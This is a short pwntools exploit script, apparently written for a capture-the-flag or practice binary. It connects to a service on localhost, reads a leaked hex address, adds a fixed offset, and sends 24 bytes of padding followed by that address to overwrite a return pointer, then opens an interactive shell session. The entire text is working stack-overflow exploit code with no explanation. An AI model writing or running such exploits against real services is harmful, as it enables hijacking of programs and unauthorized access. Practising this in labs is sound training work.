from pwn import *

#p = process('./binary')

p = remote('127.0.0.1', 33876)

x = int(p.recvuntil('What').split('\n')[0].split(' ')[-1].strip(), 16)+384

p.sendline('A'*24+p64(x))
p.interactive()
